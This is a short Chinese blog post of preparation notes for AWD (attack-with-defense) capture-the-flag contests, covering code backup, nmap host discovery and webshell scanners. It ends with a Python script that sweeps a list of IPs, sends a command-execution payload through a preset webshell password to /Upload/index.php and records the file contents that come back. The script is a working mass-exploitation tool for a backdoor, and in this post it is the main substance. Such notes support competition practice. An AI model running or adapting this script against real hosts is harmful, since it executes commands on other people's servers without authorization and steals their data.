---
title: awd准备工作
date: 2018-08-21 10:32:18
tags:
password: awd-prepare
---

# 准备工作

## 源代码备份

* xftp

* scp

  > scp -r -P Port remote_username@remote_ip:remote_folder local_file
  >

## 主机发现

* nmap

  > nmap -sn 192.168.71.0/24

* httpscan

  > https://github.com/zer0h/httpscan

## 弱口令

## 预留后门

* D盾
* 河马j

后门利用脚本

```python
#coding=utf-8
import requests
url="http://192.168.71."
url1=""
shell="/Upload/index.php"
passwd="abcde10db05bd4f6a24c94d7edde441d18545" 
port="80"
payload = {passwd: 'system(\'cat /flag\');'}
f=open("webshelllist.txt","w") 
f1=open("firstround_flag.txt","w")
for i in [51,52,53,11,12,13,21,22,23,31,32,33,41,42,43,71,72,73,81,82,83]: 
    url1=url+str(i)+":"+port+shell
    try:
        res=requests.post(url1,payload,timeout=1)
        if res.status_code == requests.codes.ok:
            print url1+" connect shell sucess,flag is "+res.text
            print >>f1,url1+" connect shell sucess,flag is "+res.text
            print >>f,url1+","+passwd
        else:
            print "shell 404"
    except:
        print url1+" connect shell fail"
		
f.close()
f1.close()
```

